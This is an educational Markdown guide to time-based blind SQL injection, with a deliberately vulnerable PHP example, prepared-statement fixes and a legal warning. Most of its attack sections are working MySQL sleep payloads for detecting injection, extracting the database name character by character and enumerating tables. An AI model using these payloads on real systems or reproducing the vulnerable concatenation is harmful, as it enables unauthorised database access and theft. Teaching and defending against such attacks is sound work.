# 🔐 Time-Based Blind SQL Injection

<div align="center">

**A Simple Visual Guide**

---

![Security](https://img.shields.io/badge/Topic-SQL_Injection-red?style=flat-square) ![Level](https://img.shields.io/badge/Level-Intermediate-orange?style=flat-square) ![Type](https://img.shields.io/badge/Type-Time_Based-blue?style=flat-square)

---

</div>

## 📖 What is Time-Based Blind SQL Injection?

Time-Based Blind SQL Injection is a technique where attackers **measure response time** to extract information from a database, even when the application doesn't show any visible output.

```
Normal Query:     Response in 0.1 seconds  ⚡
Malicious Query:  Response in 5+ seconds   ⏰
```

---

## 🎯 The Vulnerable Code

### 📄 File: `blind-injection-time-based.php`

```php
<?php
include("connection.php");

if (isset($_GET['id'])) {
    
    // ⚠️ DANGER: User input directly in SQL query!
    $id = $_GET['id'];
    
    $query = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
    
    $result = mysqli_query($connection, $query);
}

// This message ALWAYS shows - no matter what!
echo "Wel Come to Armour Infosec";
?>
```

### 🔴 Why This is Vulnerable

```
❌ No input validation
❌ Direct concatenation into SQL
❌ No prepared statements
❌ Same output regardless of query result
```

---

## 🧪 Testing for Vulnerability

### Step 1️⃣: Basic Tests

```sql
-- Test with single quote
id=1'

-- Test with double quote
id=1"

-- Test with comment
id=1' --+
```

### Step 2️⃣: Boolean Tests

```sql
-- Always TRUE
id=1' AND 1 --+

-- Always FALSE
id=1' AND 0 --+
```

### Step 3️⃣: Time Delay Test

```sql
-- If page delays 10 seconds = VULNERABLE! 🚨
id=1' AND (select sleep(10)) --+
```

---

## 💣 Attack Payloads

### 🔍 Find Database Name Length

```sql
id=1' AND (select if((select length(database())) = 6, sleep(10), null)) --+
id=1' AND (select if((select length(database())) = 7, sleep(10), null)) --+
id=1' AND (select if((select length(database())) = 9, sleep(10), null)) --+
```

**If delayed at 9 → Database name has 9 characters!**

---

### 🔍 Extract Database Name (Character by Character)

```sql
-- First character = 'a'?
id=1' AND (select if(substr(database(),1,1) = 'a', sleep(10), null)) --+

-- First character = 'b'?
id=1' AND (select if(substr(database(),1,1) = 'b', sleep(10), null)) --+
```

**Keep testing until you find each character!**

---

### 🔍 Check Full Database Name

```sql
id=1' AND (select if((select database()) = "armour_db", sleep(10), null)) --+

id=1' AND (select if((select database()) = "sql_db", sleep(10), null)) --+
```

**If delayed → Name matches!**

---

### 🔍 Extract Table Names

```sql
-- First table name starts with 'c'?
id=1' AND (select if((select substr(table_name,1,1) 
          from information_schema.tables 
          where table_schema=database() limit 0,1) = 'c', sleep(10), null)) --+

-- Check full table name = 'city'?
id=1' AND (select if((select table_name 
          from information_schema.tables 
          where table_schema=database() limit 0,1) = 'city', sleep(10), null)) --+

-- Check second table name = 'course'?
id=1' AND (select if((select table_name 
          from information_schema.tables 
          where table_schema=database() limit 1,1) = 'course', sleep(10), null)) --+
```

---

## 🎨 Visual Attack Flow

```
┌─────────────────────────────────────────────────────────┐
│  Step 1: Test for Vulnerability                         │
│  ─────────────────────────────────                      │
│  Inject: id=1' AND SLEEP(5)--+                          │
│  Result: Page delays 5 seconds ✓                        │
│                                                          │
│  Step 2: Find Database Length                           │
│  ─────────────────────────────                          │
│  Test: LENGTH(DATABASE()) = 9                           │
│  Result: Delayed → Length is 9! ✓                       │
│                                                          │
│  Step 3: Extract Database Name                          │
│  ──────────────────────────────                         │
│  Position 1: 'a' = delay ✓ → 'a'                        │
│  Position 2: 'r' = delay ✓ → 'r'                        │
│  Position 3: 'm' = delay ✓ → 'm'                        │
│  ...continue...                                          │
│  Result: "armour_db" ✓                                   │
│                                                          │
│  Step 4: Extract Table Names                            │
│  ───────────────────────────                            │
│  Table 1: "city" ✓                                       │
│  Table 2: "course" ✓                                     │
│  Table 3: "users" ✓                                      │
└─────────────────────────────────────────────────────────┘
```

---

## ⚡ How It Works

### Normal Request

```
Browser → Server: ?id=1
Server processes in 0.1s
Server → Browser: "Wel Come to Armour Infosec"
```

### Malicious Request

```
Browser → Server: ?id=1' AND SLEEP(10)--+
Server processes SLEEP(10) - waits 10 seconds! ⏰
Server → Browser: "Wel Come to Armour Infosec" (after 10s)
```

### The Key Insight

```
⏱️ Response Time = Information Leakage

Fast (0.1s)  = Condition FALSE ❌
Slow (10s)   = Condition TRUE  ✅

Attacker extracts data bit-by-bit by measuring timing!
```

---

## 🛡️ How to Prevent This

### ✅ Use Prepared Statements

```php
<?php
// SECURE CODE ✓
$stmt = $connection->prepare("SELECT * FROM users WHERE id = ? LIMIT 1");
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();
?>
```

### ✅ Validate Input

```php
<?php
// Only accept integers
$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);

if ($id === false) {
    die("Invalid ID!");
}
?>
```

### ✅ Use PDO

```php
<?php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
$stmt->execute();
?>
```

---

## 📊 Quick Reference Table

|Payload Type|Example|What It Does|
|---|---|---|
|**Basic Sleep**|`id=1' AND SLEEP(5)--+`|Delays response by 5 seconds|
|**Conditional Sleep**|`id=1' AND IF(1=1, SLEEP(5), 0)--+`|Sleep only if condition is true|
|**Length Check**|`id=1' AND IF(LENGTH(DATABASE())=9, SLEEP(5), 0)--+`|Check database name length|
|**Character Extract**|`id=1' AND IF(SUBSTR(DATABASE(),1,1)='a', SLEEP(5), 0)--+`|Extract first character|
|**Table Enumeration**|`id=1' AND IF((SELECT table_name FROM information_schema.tables LIMIT 0,1)='users', SLEEP(5), 0)--+`|Find table names|

---

## 🎯 Attack Summary

```
┌────────────────────────────────────────────────┐
│                                                │
│  1. Find vulnerable parameter                 │
│     → Test with quotes and sleep               │
│                                                │
│  2. Determine database name length             │
│     → Test different lengths                   │
│                                                │
│  3. Extract database name                      │
│     → Character by character                   │
│                                                │
│  4. List tables                                │
│     → Use information_schema                   │
│                                                │
│  5. Extract column names                       │
│     → Target specific tables                   │
│                                                │
│  6. Dump data                                  │
│     → Character by character                   │
│                                                │
└────────────────────────────────────────────────┘
```

---

## 🚨 Key Takeaways

### ❌ Vulnerable Code Pattern

```php
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id='$id'";
```

### ✅ Secure Code Pattern

```php
$stmt = $connection->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
```

### 🎓 Why Time-Based?

```
✓ No visible output from application
✓ Same message always displays
✓ Response time is ONLY observable difference
✓ Perfect for "blind" injection scenarios
```

---

## 🔥 Real-World Example

### Scenario

You're testing a website: `vulnerable-site.com/user.php?id=1`

### Step-by-Step Attack

**1. Test Basic Injection**

```
URL: vulnerable-site.com/user.php?id=1'
Result: No error shown, page loads normally
```

**2. Test Time Delay**

```
URL: vulnerable-site.com/user.php?id=1' AND SLEEP(10)--+
Result: Page takes 10+ seconds to load
Status: 🚨 VULNERABLE!
```

**3. Extract Database Name**

```
Test length = 9: Page delays ✓
Character 1 = 'a': Page delays ✓
Character 2 = 'r': Page delays ✓
Character 3 = 'm': Page delays ✓
...continue...
Database: "armour_db"
```

**4. Extract Tables**

```
Table 1: "users" ✓
Table 2: "admin" ✓
Table 3: "passwords" ✓
```

---

## ⚠️ Legal Warning

<div align="center">

### 🚫 DO NOT USE THIS ON WEBSITES YOU DON'T OWN!

```
✅ Your own test environments
✅ Educational labs
✅ Authorized penetration tests
✅ Bug bounty programs (with permission)

❌ Websites without permission
❌ Production systems
❌ Other people's applications
❌ Any unauthorized testing

Unauthorized access is ILLEGAL and can result in:
• Criminal prosecution
• Heavy fines
• Jail time
• Permanent criminal record
```

</div>

---

## 📚 Learn More

- **OWASP SQL Injection Guide**: https://owasp.org/www-community/attacks/SQL_Injection
- **PHP Security**: https://www.php.net/manual/en/security.database.sql-injection.php
- **SQL Injection Cheat Sheet**: https://portswigger.net/web-security/sql-injection/cheat-sheet

---

<div align="center">

## 🎓 Study • Practice • Secure

**Remember**: The goal is to learn how to DEFEND against these attacks!

---

**Created**: February 2026  
**Purpose**: Educational Training Only

---

🔐 **Stay Ethical • Stay Legal • Stay Secure** 🔐

</div>